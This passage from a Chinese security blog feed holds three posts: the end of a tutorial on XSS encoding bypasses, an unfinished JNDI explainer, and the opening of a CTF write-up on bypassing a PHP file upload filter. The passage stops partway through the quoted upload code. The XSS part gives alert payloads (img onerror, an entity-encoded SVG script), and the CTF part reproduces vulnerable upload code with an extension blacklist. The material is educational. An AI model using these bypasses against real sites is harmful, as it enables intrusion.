function_">getElementById</span>(<span class="string">&quot;a&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">var</span> b = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;b&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 用户可控点value</span></span></span><br><span class="line"><span class="language-javascript">		a.<span class="property">innerHTML</span>=<span class="string">&quot;&lt;img src=# onerror=alert(123)&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// // html编码函数</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// function htmlEncodeByRegExp(str) &#123;</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//         var temp = &quot;&quot;;</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//         if (str.length == 0) return &quot;&quot;;</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//         temp = str.replace(/&amp;/g, &quot;&amp;amp;&quot;);</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//         temp = temp.replace(/&lt;/g, &quot;&amp;lt;&quot;);</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//         temp = temp.replace(/&gt;/g, &quot;&amp;gt;&quot;);</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//         temp = temp.replace(/\&#x27;/g, &quot;&amp;#39;&quot;);</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//         temp = temp.replace(/\&quot;/g, &quot;&amp;quot;&quot;);</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//         return temp;</span></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//     &#125;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>看看上面这个如果innerHTML可控会有多少种编码方式？如果你真的理解了这里就不再赘述，应该是多层unicode和HTML编码可以混用依然执行弹窗。</p>
<p>所以，得出结论，在大多数情况下如果必须插入标签才能触发的xss实体化编码还是好用的，当然，具体情况要具体分析</p>
<p>另外我们在一些过滤绕过中，发现svg的出场次数也挺高的，这是因为svg是可以内嵌其他标签，同时会被html解码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"><span class="symbol">&amp;#x0061;</span><span class="symbol">&amp;#x006c;</span><span class="symbol">&amp;#x0065;</span><span class="symbol">&amp;#x0072;</span><span class="symbol">&amp;#x0074;</span><span class="symbol">&amp;#x0028;</span><span class="symbol">&amp;#x0031;</span><span class="symbol">&amp;#x0031;</span><span class="symbol">&amp;#x0031;</span><span class="symbol">&amp;#x0031;</span><span class="symbol">&amp;#x0029;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>HTML解析、CSS解析、JS解析和URL解析。这四个解析器的解析顺序搞懂，XSS的编码绕过问题就比较容易理解了，遇到一些SRC的xss点也可以绕过的更从容一点。</p>
<h2 id="Refrence"><a href="#Refrence" class="headerlink" title="Refrence"></a>Refrence</h2><ul>
<li><p><a href="http://xuelinf.github.io/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/">http://xuelinf.github.io/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/</a></p>
</li>
<li><p><a href="http://taligarsiel.com/Projects/howbrowserswork1.htm#Parsing_general">http://taligarsiel.com/Projects/howbrowserswork1.htm#Parsing_general</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>什么是JNDI</title>
    <url>//posts/What-is-JDNI/</url>
    <content><![CDATA[<h1 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI"></a>什么是JNDI</h1><p>J2SE，是java2的标准版，主要用于开发桌面的应用程序。</p>
<p><strong>J2SE包含了构成java语言核心的类：数据库连接、接口定义、输入输出、网络编辑等。</strong></p>
<p>J2EE, 是java2的企业版，主要用于分布式的网络程序的开发。</p>
<p><strong>j2ee包含j2se中的类，还包含用于开发企业级应用的类，也包含企业应用中很多的API。例如：JDBC、JNDI、EJB等</strong>。</p>
<p><strong>不少专家认为，没有透彻理解JNDI的意义和作用，就没有真正掌握J2EE特别是EJB的知识</strong></p>
<h2 id="JNDI概念"><a href="#JNDI概念" class="headerlink" title="JNDI概念"></a>JNDI概念</h2><p>JNDI全称Java Naming and Directory Interface 翻译过来就是Java命名和目录接口。这个概念搞出来就是为了方便人们来记录一些不容易记录都内容。有点类似于域名和ip的映射。所以如果要深入的学可能会被绕进去，现在你可以简单的理解为他是一个字典，给不同的对象和属性（value）取名（key）。到时候好找出来用。</p>
<h2 id="JNDI作用"><a href="#JNDI作用" class="headerlink" title="JNDI作用"></a>JNDI作用</h2><p>网上比较经典的例子就是JDBC连接数据库：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Scr</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//JDBC驱动名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">JDBC_DRIVER</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="comment">//数据库URL：这里的tt是数据库名称</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">JDBC_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/tt?useSSL=false&amp;serverTimezone=UTC&quot;</span>;</span><br><span class="line"><span class="comment">//        数据库的用户名与密码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">USER</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">PASS</span> <span class="operator">=</span> <span class="string">&quot;admin123&quot;</span>;</span><br><span class="line">        <span class="comment">//通过DriverManager类获得该连接对象才能访问数据库</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//        通过Connection获得该结果对象用于执行静态的SQL语句</span></span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//            注册JDBC驱动</span></span><br><span class="line">            Class.forName(JDBC_DRIVER);</span><br><span class="line">            </span><br><span class="line"><span class="comment">//            数据库的连接：通过DriverManager类的getConnection方法，传入三个参数：数据库URL、用户名、用户密码，实例化connection对象</span></span><br><span class="line">            connection = DriverManager.getConnection(JDBC_URL,USER,PASS);</span><br><span class="line"><span class="comment">//            实例化statement对象</span></span><br><span class="line">            statement = (Statement) connection.createStatement();</span><br><span class="line"><span class="comment">//            定义数据库查询语句：查询aa表中的name、sex两列数据</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT name,sex FROM aa&quot;</span>;</span><br><span class="line"><span class="comment">//            执行查询语句</span></span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rSet</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line"><span class="comment">//            展开查询到的数据</span></span><br><span class="line">            <span class="keyword">while</span>(rSet.next()) &#123;</span><br><span class="line"><span class="comment">//                这里getString()方法中的参数对应的是数据库表中的列名</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">get_name</span> <span class="operator">=</span> rSet.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">get_sex</span> <span class="operator">=</span> rSet.getString(<span class="string">&quot;sex&quot;</span>);</span><br><span class="line"><span class="comment">//                输出数据</span></span><br><span class="line">                System.out.println(<span class="string">&quot;名字:&quot;</span>+get_name);</span><br><span class="line">                System.out.print(<span class="string">&quot;性别:&quot;</span>+get_sex);                   </span><br><span class="line">            &#125;  </span><br><span class="line"><span class="comment">//            依次关闭对象</span></span><br><span class="line">            rSet.close();</span><br><span class="line">            statement.close();</span><br><span class="line">            connection.close();            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>可以看到这是我们初学java时的代码，因为那时候我们都是一个人开发整个系统，如果有一天一家公司有成百上千的人开发同一套系统呢？是不是不应该所有的程序员都知道这个账号密码、url格式、后端的实现逻辑、数据库类型等等？这就是Java编程中重要的思想：<strong>解藕</strong>。</p>
<p>解藕当然呢不只JNDI这一种方式。很多时候封装的越来越细小也算是解耦。但是JNDI提供了这种更方便的解藕概念。</p>
<p>比如上面这个链接数据库的代码我可以用JNDI这样做：</p>
<p>定义一个xml模版，mysql.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">datasources</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">local-tx-datasource</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">jndi-name</span>&gt;</span>mysqlconfigsouce<span class="tag">&lt;/<span class="name">jndi-name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">connection-url</span>&gt;</span>jdbc:mysql://localhost:3306/<span class="tag">&lt;/<span class="name">connection-url</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">driver-class</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">driver-class</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">user-name</span>&gt;</span>root<span class="tag">&lt;/<span class="name">user-name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd<span class="tag">&lt;/<span class="name">password</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">exception-sorter-class-name</span>&gt;</span>  </span><br><span class="line">org.jboss.resource.adapter.jdbc.vendor.MySQLExceptionSorter  </span><br><span class="line"><span class="tag">&lt;/<span class="name">exception-sorter-class-name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">metadata</span>&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">type-mapping</span>&gt;</span>mySQL<span class="tag">&lt;/<span class="name">type-mapping</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">metadata</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">local-tx-datasource</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">datasources</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
<p>然后我们在程序中引用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Connection conn=<span class="literal">null</span>;  </span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">  Context ctx=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();  <span class="comment">//获取上下文</span></span><br><span class="line">  Object datasourceRef=ctx.lookup(<span class="string">&quot;java:mysqlconfigsouce&quot;</span>); <span class="comment">//引用数据源</span></span><br><span class="line">  DataSource ds=(Datasource)datasourceRef;  </span><br><span class="line">  conn=ds.getConnection();  </span><br><span class="line">  ......  </span><br><span class="line">  c.close();  </span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e) &#123;  </span><br><span class="line">  e.printStackTrace();  </span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;  </span><br><span class="line">  <span class="keyword">if</span>(conn!=<span class="literal">null</span>) &#123;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">      conn.close();  </span><br><span class="line">    &#125; <span class="keyword">catch</span>(SQLException e) &#123; &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当然JNDI只是一个概念，具体实现还有rmi和ldap等协议参与其中。上面只是举个例子。</p>
<p>这里补充一点：正如我们第一节所说的，JNDI是一个类似域名和ip的对应机制，那javax.naming 的包中就提供了Context接口，最重要的</p>
<p>就是两个方法：</p>
<p>1、 void bind( String name , Object object )<br>    绑定<br>2、Object lookup( String name )<br>    获取</p>
<p>JNDI在JAVA应用程序中的位置：</p>
<p>![image-20230130163311234](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230130163311234.png)</p>
<p>可以看到JNDI在应用程序和底层服务LADP、DNS、RMI等等之间，可以理解为JNDI封装了一套管理命名和目录的接口，通过JNDI我们可以使用rmi、LDAP等各种协议的命名和目录服务。当然如果JNDI的检索参数被控制，就会引发重大安全问题，这就是后面要写的JNDI注入的问题。</p>
<p>———–太忙了先不写了———</p>
<p>要分析的漏洞：fastjson、log4j、shiro、weblogic那些</p>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯web-WP-AK</title>
    <url>//posts/%E7%BD%91%E9%BC%8E%E6%9D%AF-web-wep-AK/</url>
    <content><![CDATA[<h2 id="网鼎杯比赛感想"><a href="#网鼎杯比赛感想" class="headerlink" title="网鼎杯比赛感想"></a>网鼎杯比赛感想</h2><p><strong>水浅王八多，python真是多。</strong> 白虎组也太卷了，金融行业尤其卷，能做出来crypto和web我能理解，pwn、reverse都是强项，比web还强，那是平常不干业务吗？难以理解，而且现在比赛都不是pwn爹了，那是pwn爷爷，ak了web，还做了misc和crypto，最后只有三四百分，一道pwn题就是400多分，一道pwn就能进线下。现在web狗真是没啥活路。</p>
<p>吐槽归吐槽，但是还是技不如人。不过这次白虎组web基本都做出来了。先记录下WP吧！</p>
<span id="more"></span>

<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>一共有三个web题目，都是序号形式的，下面我就随意命名了，主要是记录下思路。</p>
<h3 id="绕过一堆限制进行文件上传"><a href="#绕过一堆限制进行文件上传" class="headerlink" title="绕过一堆限制进行文件上传"></a>绕过一堆限制进行文件上传</h3><p>首先是扫描目录发现git泄漏。</p>
<p>核心函数在application controller里面,源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; action=&#x27;</span>.<span class="title function_ invoke__">url</span>(<span class="string">&#x27;index/index/upload&#x27;</span>).<span class="string">&#x27;&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;file&quot; name=&quot;hw_file&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">isPost</span>())&#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;hw_file&#x27;</span>]??<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$file</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;请选择文件&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &gt; <span class="number">1024</span>*<span class="number">1024</span>*<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;文件大小不能超过2M&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_error</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;上传失败&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$file_type</span> = <span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">            <span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$file_name</span>);</span><br><span class="line">            <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$file_ext</span>));</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file_type</span>, <span class="string">&quot;image/&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">upload_as_image</span>(<span class="variable">$file_ext</span>, <span class="variable">$file_tmp</span>, <span class="string">&quot;../uploads/images/&quot;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>).<span class="string">&quot;/&quot;</span>, [<span class="string">&quot;gif&quot;</span>], <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&quot;hw_file_name&quot;</span>)??<span class="literal">FALSE</span>))&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;上传成功&#x27;</span>]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;上传失败&#x27;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">upload_as_text</span>(<span class="variable">$file_ext</span>, <span class="variable">$file_tmp</span>, <span class="string">&quot;../uploads/files/&quot;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>).<span class="string">&quot;/&quot;</span>, <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&quot;hw_file_name&quot;</span>)??<span class="literal">FALSE</span>))&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;上传成功&#x27;</span>]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;上传失败&#x27;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;请求方式错误&#x27;</span>]);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_as_image</span>(<span class="params"><span class="variable">$image_type</span>, <span class="variable">$image_tmp_file</span>, <span class="variable">$upload_base_dir</span>, <span class="variable">$file_ext_black_list</span>, <span class="variable">$image_filename</span>=<span class="literal">FALSE</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$image_type</span>, <span class="variable">$file_ext_black_list</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;jpg&#x27;</span>:</span><br><span class="line">                <span class="variable">$image_ext</span> = <span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;png&#x27;</span>:</span><br><span class="line">                <span class="variable">$image_ext</span> = <span class="string">&#x27;.png&#x27;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;gif&#x27;</span>:</span><br><span class="line">                <span class="variable">$image_ext</span> = <span class="string">&#x27;.gif&#x27;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="variable">$image_ext</span> = <span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$image_size</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$image_tmp_file</span>);</span><br><span class="line">        <span class="variable">$image_width</span> = <span class="variable">$image_size</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="variable">$image_height</span> = <span class="variable">$image_size</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$image_width</span> &gt; <span class="number">200</span> || <span class="variable">$image_height</span> &gt; <span class="number">200</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$image_filename</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$image_filename</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>) . <span class="title function_ invoke__">rand</span>(<span class="number">1000</span>, <span class="number">9999</span>) . <span class="variable">$image_ext</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$image_filename</span> = <span class="variable">$image_filename</span> . <span class="variable">$image_ext</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$upload_base_dir</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload_base_dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$image_file_path</span> = <span class="variable">$upload_base_dir</span> . <span class="variable">$image_filename</span>;</span><br><span class="line">        <span class="title function_ invoke__">rename</span>(<span class="variable">$image_tmp_file</span>, <span class="variable">$image_file_path</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_as_text</span>(<span class="params"><span class="variable">$text_type</span>, <span class="variable">$text_tmp_file</span>, <span class="variable">$upload_base_dir</span>, <span class="variable">$text_filename</span>=<span class="literal">FALSE</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$text_type</span>, <span class="string">&quot;ph&quot;</span>)  || <span class="title function_ invoke__">in_array</span>(<span class="variable">$text_type</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;sql&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;shtml&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;php7&#x27;</span>, <span class="string">&#x27;phtm&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>, <span class="string">&#x27;php8&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;tpl&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$text_filename</span>, <span class="string">&quot;.&quot;</span>) || <span class="title function_ invoke__">strstr</span>(<span class="variable">$text_filename</span>, <span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">strlen</span>(<span class="variable">$text_type</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$text_ext</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//仅包含字母</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$text_type</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$text_ext</span> = <span class="string">&quot;.&quot;</span> . <span class="variable">$text_type</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$text_filename</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$text_filename</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>) . <span class="title function_ invoke__">rand</span>(<span class="number">1000</span>, <span class="number">9999</span>) . <span class="variable">$text_ext</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$text_filename</span> = <span class="variable">$text_filename</span> . <span class="variable">$text_ext</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$text_filename</span>) == <span class="number">0</span> || <span class="title function_ invoke__">strstr</span>(<span class="variable">$text_filename</span>, <span class="string">&quot;/&quot;</span>) ||!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9_]/is&#x27;</span>, <span class="variable">$text_filename</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$upload_base_dir</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span 